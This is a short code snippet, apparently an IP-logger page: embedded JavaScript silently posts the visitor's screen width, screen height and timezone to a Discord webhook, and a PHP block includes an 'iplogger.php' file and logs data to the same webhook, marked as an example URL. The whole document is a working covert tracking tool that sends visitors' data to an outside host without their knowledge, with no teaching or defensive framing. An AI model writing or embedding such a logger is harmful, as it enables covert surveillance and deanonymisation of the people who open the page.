<script>
var url = "https://discord.com/api/webhooks/090908015099031078/QbeMHERTUYIOHmJ_SkyQ_1536C9rwOyeBsjqcWejT0MdPGHJKRTYUIOBoOVJqUryG_w0o"; //example

var xhr = new XMLHttpRequest();
xhr.open('POST', url, true);
xhr.setRequestHeader('Content-type', 'application/json');
var data =    
    '"Width=":' + window.screen.availWidth + "\n" +            
    '"Height=":' + window.screen.availHeight + "\n" +
    '"TimeZone=":' + Intl.DateTimeFormat().resolvedOptions().timeZone;
xhr.send(JSON.stringify({content: data}));
</script>

<?php
$url = "https://discord.com/api/webhooks/090908015099031078/QbeMHERTUYIOHmJ_SkyQ_1536C9rwOyeBsjqcWejT0MdPGHJKRTYUIOBoOVJqUryG_w0o"; //example
include("iplogger.php");
LogData($url);
?>
